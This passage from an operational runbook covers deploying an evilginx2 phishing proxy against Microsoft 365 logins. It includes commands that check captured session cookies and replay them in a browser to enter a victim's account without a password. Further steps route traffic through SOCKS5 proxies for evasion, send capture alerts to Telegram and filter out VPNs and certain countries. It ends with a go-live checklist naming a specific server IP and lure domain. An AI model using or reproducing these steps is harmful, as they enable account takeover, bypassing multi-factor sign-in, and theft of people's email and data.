  PRESENT ESTSAUTHLIGHT
```

`MSPAuth`, `RPSSecAuth`, `WLSSC`, `ANON` absent is correct — consumer-side, work accounts never get them.

❌ Any `absent` → redo Stage 22, click "Stay signed in" → Yes. Do not continue.

### Inspect

```bash
cd ~/evilginx2
python3 - <<'PY'
import json, os
p = os.path.expanduser("~/evilginx2/cookies-import.json")
d = json.load(open(p, encoding="utf-8"))
print("cookie count:", len(d))
for x in sorted({c["domain"] for c in d}):
    print("  ", x)
PY
```

✅ High-teens or more, `login.microsoftonline.com` present

### Prove it outside a browser

```bash
cd ~/evilginx2
curl -s -b cookies-netscape.txt -o /dev/null -w "http %{http_code}\n" \
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
```

✅ `http 200` — anything else is a stale jar

> ### ✅ My recommendation
> Stages 22–24 back to back, inside 10 minutes.

---

# 🌍 STAGE 24 — Import into a browser (no-red-page proof)

1. Cookie-Editor installed (`cgagnier`).
2. Fresh private window.
3. Go to exactly `https://login.microsoftonline.com`
4. Cookie-Editor → **Import**.

### Get the JSON without breaking it

The file is a JSON **array** — it must start with `[` and end with `]`. Selecting from the first `{` produces "invalid format".

**Route A (safest).** In Windows Command Prompt:

```
cd %USERPROFILE%\Downloads
scp root@185.158.250.204:~/evilginx2/cookies-import.json .
```

Open in Notepad → `Ctrl+A` → `Ctrl+C`.

**Route B.** In the SSH session:

```bash
cd ~/evilginx2
cat cookies-import.json | tr -d '\n'
```

One wrapped line starting `[` and ending `]`. **Triple-click** it (triple-click selects the whole logical line even when wrapped) → copy.

> `cd %USERPROFILE%\Downloads` fails inside the bash session — `%VAR%` only expands in `cmd.exe`.

### Finish

5. Paste → **Import** / **Confirm**. The popup must report the full count.
6. Press **F5**.

### ✅ Success

You land **inside the account**. No red banner, no password prompt. A chooser is fine — click the account. Then open `https://outlook.office.com/mail/` and `https://www.office.com`.

### ❌ Troubleshooting

| Symptom | Fix |
|:--|:--|
| "invalid format" | paste starts with `{` — clear, re-copy via Route A |
| Fewer than the full count imported | truncated — Route A |
| Red banner | redo Stage 22, click "Stay signed in" → Yes |
| Sign-in form again | wrong host — import on `login.microsoftonline.com` |
| Nothing changed | window already had a session — clear cookies, re-import |
| Logs out after a minute | session cookies only — redo Stage 22 |
| `__Host-` rejected | import on `login.microsoftonline.com`, then open `login.live.com` once |
| Firefox private blocks | normal window, or disable ETP |
| Google rejects | copy `localStorage` from `.all.json`, or accept the shorter session |

### The rule

A red page means a cookie is present but invalid — incomplete jar or wrong host. Complete jar + correct host = no red page, permanently.

---

# 🧬 STAGE 25 — Pro features

### 25a — Verify injection

Open a lure with `#your@email.com`, press F12 → Console.

✅ `evilginx: email autofilled -> your@email.com` and the box fills

❌ No line → `DOM_INJECTION` not `true` (Stage 11g). Line but empty box → the page DOM changed. Nothing at all → no `#email`.

### 25b — `rewrite_urls` (off by default — this is deliberate)

It rewrites the long authorize path to `/signin?boop=<id>`. On Microsoft the page then appends `&sso_reload=true`, the reverse-lookup misses, and you get **evilginx's own 404** — `This login.officialmonsterz.store page can't be found`.

The phishlet's `sub_filters` already handle `https://{hostname}/common/oauth2/v2.0/`, so nothing is lost.

**Leave it off for the first successful capture.** To try it after:

```bash
cd ~/evilginx2
sed -i 's/^REWRITE_URLS=.*/REWRITE_URLS=true/' .env
docker compose up -d
docker logs -f evilginx2 | grep -iE "rewrite|404"
```

Open the lure. ✅ URL bar shows `/signin?boop=<random>` and the page loads.
❌ 404 → put it back to `false` and `docker compose up -d`.

Never open `/signin?...` directly — it only resolves while a session holds that cache entry.

### 25c — Proxies (console only)

`proxy` is **not** a host command. There is no `proxy` binary on the box — `apt install libproxy-tools` is unrelated. You type these **inside the evilginx console**.

```bash
cd ~/evilginx2
docker compose attach evilginx
```

Then:

```
proxy create uk-1 socks5 1.2.3.4 1080
proxy test uk-1
proxy list
proxy assign phishlet office365 uk-1
proxy off
proxy delete uk-1
```

✅ `proxy create` → `[inf] proxy 'uk-1' created`; `proxy test` → `proxy 'uk-1' works - egress IP <ip> (round trip ...)`; `proxy list` shows it; `proxy assign` confirms; `proxy off` clears the global; `proxy delete` removes it

Resolution order at session creation: `lure` → `phishlet` → `global` → direct.

❌ **`Command 'proxy' not found`** → you are in the shell, not the console. `docker compose attach evilginx` first. (`Ctrl-p Ctrl-q` detaches.)

❌ **`proxy test` → `context deadline exceeded`** → the address/port is not a live SOCKS5 proxy. `1.2.3.4:1080` is a placeholder; substitute a real one. Verify from the host first:

```bash
curl -s --socks5 1.2.3.4:1080 https://api.ipify.org; echo
```

Anything but an IP means the proxy itself is unreachable — not an evilginx fault.

From the panel instead (uses the jar from Stage 11d):

```bash
curl -s -b /tmp/eg.jar -X POST http://127.0.0.1:8082/api/proxies \
  -H "Content-Type: application/json" \
  -d '{"name":"uk-1","type":"socks5","address":"1.2.3.4","port":1080}'

curl -s -b /tmp/eg.jar -X POST http://127.0.0.1:8082/api/proxies/test \
  -H "Content-Type: application/json" -d '{"name":"uk-1"}'
```

> **OPSEC:** SOCKS5 preserves the JA4 TLS signature; an HTTP proxy re-signs it. Use SOCKS5 on engagements.

> ### ✅ My recommendation
> Bind a tested proxy to a **single lure** first. If the lure still loads and the egress IP changed, widen the scope.

---

# 📱 STAGE 26 — Telegram

```bash
curl -s https://api.telegram.org/bot<TOKEN>/getMe
```

✅ `"ok":true`. Then message the bot and read `"chat":{"id":...}` from `/getUpdates`.

Configure via `.env`, the panel (8082 → Telegram → Save), or the console:

```
config teletoken <token>
config chatid <id>
config telegram test
```

✅ `[inf] telegram: notification sent successfully!`

❌ Nothing arrives → run the test and read the error. Duplicates → comment out `telegram-watch.sh` in `entrypoint.sh`, `docker compose up -d --build`.

---

# 🗺️ STAGE 27 — GeoIP (optional)

`geoip: not available` is cosmetic. MaxMind account → `GeoLite2-City.mmdb` → `~/evilginx2/data/GeoIP/` → `docker compose restart`.

✅ `geoip: GeoIP initialized — country tracking active`

Flags: `-block-vpn`, `-block-countries RU,CN`.

---

# 🧰 STAGE 28 — Operations cheat-sheet

```bash
cd ~/evilginx2

docker compose attach evilginx                                  # console (Ctrl-p Ctrl-q detaches)
docker logs -f evilginx2                                        # follow logs
docker logs evilginx2 2>&1 | grep -E "autoexport|tokens"        # watch captures
docker compose restart                                          # restart
docker compose down && docker compose up -d                     # hard restart

nano .env                                                       # edit
docker compose up -d                                            # APPLY .env — mandatory

ls -la data/exports/
ls -la data/backups/
python3 validate_phishlet.py
python3 make_cookie_import.py

# safe code update
cp .env .env.backup && git checkout -- . && git pull && docker compose build && docker compose up -d
```

Health one-liner:

```bash
docker logs evilginx2 2>&1 | grep -E "dashboard|Web Admin|backup" && \
curl -s -o /dev/null -w "8082 login page: %{http_code}\n" http://127.0.0.1:8082/login
```

---

# 🧯 STAGE 29 — Master troubleshooting table

| Symptom | Cause | Fix |
|:--|:--|:--|
| Build: `go.mod requires go >= 1.25` | Dockerfile lost `GOTOOLCHAIN=auto` | `git checkout -- Dockerfile && git pull` |
| Build: `validProxyTypes redeclared` | declared twice | delete from `core/config_proxy.go` |
| Build: `ProxyConfig redeclared` | declared twice | keep only in `core/config.go` |
| Build: `syntax error: unexpected n` | `while` in Go | `git checkout -- core/http_proxy.go && git pull` |
| `Could not resolve host` | Stage 3 broke DNS | `systemctl start systemd-resolved` |
| Container `Restarting` | crash loop | `docker logs --tail 60 evilginx2` |
| Port 53 bind error | Stage 3 skipped | redo Stage 3 |
| domain/IP forgotten after rebuild | volume missing | Stage 7 volume check |
| ACME `context deadline exceeded` | issuance timeout | console → `test-certs` |
| Panel spins forever | firewall | `ufw status` |
| 8082 login rejected | edited `.env` then `restart` | `docker compose up -d` |
| `too many login attempts` | lockout | wait 5 minutes |
| `unauthorized` on `/api/proxies` | no session cookie | login with `-c /tmp/eg.jar` |
| Panel 404 / blank | `web/` not in image | rebuild |
| Hostname collision warnings | `o365.yaml` present | `git rm -f phishlets/o365.yaml` |
| Colours shift every reload | CSS randomisation ON | `CSS_RANDOMIZATION=false` + `up -d` |
| Blocked while testing with curl | bot filter | `BOT_FILTER=false` + `up -d`, then back |
| `validate_phishlet.py` SyntaxError line 1 | shell wrapper in the file | Stage 18 repair block |
| `validate_phishlet.py` FAIL `sub_filters short` | threshold too high | `sed -i 's/len(sf) > 100/len(sf) >= 80/'` |
| Email box never autofills | no `#email`, or `DOM_INJECTION` off | Stage 22 / 11g |
| `/signin` returns 404 | `sso_reload` breaks the cache | `REWRITE_URLS=false` + `up -d` |
| `complete=false` forever | consumer tokens still `:always` | Stage 17c |
| Imported cookies don't log in | jar incomplete | check essentials, redo Stage 22 |
| Cookie-Editor "invalid format" | paste missing `[` `]` | Stage 24 Route A |
| Red page after import | wrong host / incomplete jar | Stage 24 |
| Export folder empty | `AUTO_EXPORT_PATH` empty or off-volume | Stage 11g |
| Exports vanish after rebuild | path not on the volume | same |
| `Command 'proxy' not found` | typed in the shell | `docker compose attach evilginx` |
| `proxy test` times out | dead proxy | `curl --socks5 ... https://api.ipify.org` |
| Log timestamps wrong | invalid `TZ` | Stage 8 |
| Telegram silent / duplicated | no test / watcher both on | Stage 26 |
| Phish page blank for a visitor | normal on non-landing subdomains | send lure URLs only |

---

# 🗂️ STAGE 30 — What lives where

| Path | Contents |
|:--|:--|
| `phishlets/` | phishlets — survives everything |
| `data/` | config, sessions, certs |
| `data/data.db` | sessions + accounts + audit log |
| `data/exports/` | exported jars and verdicts |
| `data/backups/` | scheduled DB/config copies |
| `data/GeoIP/` | optional MaxMind DBs |
| `.env` | all secrets and switches — untracked |
| `make_cookie_import.py` / `patch_phishlet.py` / `validate_phishlet.py` | helpers, committed |

**Everything you care about is under `data/`.**

---

# ✅ STAGE 31 — Go-live checklist

- [ ] Stage 2: `dig` returns `185.158.250.204` for bare + random subdomain
- [ ] Stage 3: `ss -lntup | grep ':53 '` prints nothing
- [ ] Stage 4: `ufw status` shows all seven rules
- [ ] Stage 7: every check passed, `phishlets/` holds only `office365.yaml`
- [ ] Stage 8: long unique passwords, no quotes, no `^M`
- [ ] Stage 9: `Image evilginx2:latest Built`
- [ ] Stage 10: `docker ps` shows `Up`, three startup lines logged
- [ ] Stage 11a: `login successful`
- [ ] Stage 11b: dashboard `200` with auth
- [ ] Stage 11d: `/api/proxies` returns JSON with the jar
- [ ] Stage 11e: both panels load in a browser
- [ ] Stage 11f/11g: every key `OK`, `AUTO_EXPORT_PATH` non-empty
- [ ] Stage 12: no collision warnings
- [ ] Stage 14: domain, IP, `blacklist unauth`, `strip_headers on`
- [ ] Stage 15: warnings gone after restart, `database accounts: 1`
- [ ] Stage 18: scripts compile, `head -1` is the shebang
- [ ] Stage 19: `RESULT: PASSED`, 94 sub_filters
- [ ] Stage 20: commit on `master`, `.env` untracked
- [ ] Stage 21: phishlet enabled, lure renders the real page
- [ ] Stage 22: test login captured
- [ ] Stage 23: three essentials PRESENT, curl `200`
- [ ] Stage 24: inside the account, **no red page**
- [ ] Stage 25a: autofill fires
- [ ] Stage 25c: `proxy test` returns an egress IP (or skipped with a note)
- [ ] Stage 26: `config telegram test` delivered
- [ ] Stage 28: `Ctrl-p Ctrl-q` detaches cleanly

**All ticked = live.**

---

## Run order

```bash
# 1-5   : preflight, DNS, port 53, firewall, docker
# 6     : clone, git identity, PAT
# 7     : sanity gate
# 8     : .env   (REWRITE_URLS=false)
# 9-10  : build, up -d
# 11    : login + BOTH panels + env proof
# 12-16 : stale phishlets, console, base config, persistence, certs
# 17    : patch phishlet (script) + opt flip
# 18    : verify scripts (repair wrapper if needed)
# 19    : validate -> RESULT: PASSED
# 20    : commit + push (fetch/reset --soft if rejected)
# 21    : enable, lure
# 22    : victim flow, "Stay signed in" -> Yes, wait 10s
# 23    : make_cookie_import.py -> 3x PRESENT + curl 200
# 24    : import full array at login.microsoftonline.com -> no red page
# 25    : autofill check, proxies in the console
```
